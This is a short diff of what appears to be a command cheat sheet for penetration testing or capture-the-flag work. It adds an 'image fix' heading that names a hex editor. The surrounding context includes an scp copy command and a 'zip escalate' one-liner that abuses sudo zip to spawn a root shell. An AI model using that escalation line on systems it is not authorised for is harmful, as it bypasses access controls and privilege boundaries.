@@ -72,7 +72,13 @@ remote to local
  
  scp /local/test.txt user@remoteHost:/home/user/tmp/
 ```
-local to remote
+
+## image fix
+```
+hxeditor
+```
+
+
 ## zip escalate
 ```
 sudo zip filename.zip filename.txt -T --unzip-command="sh -c /bin/bash"
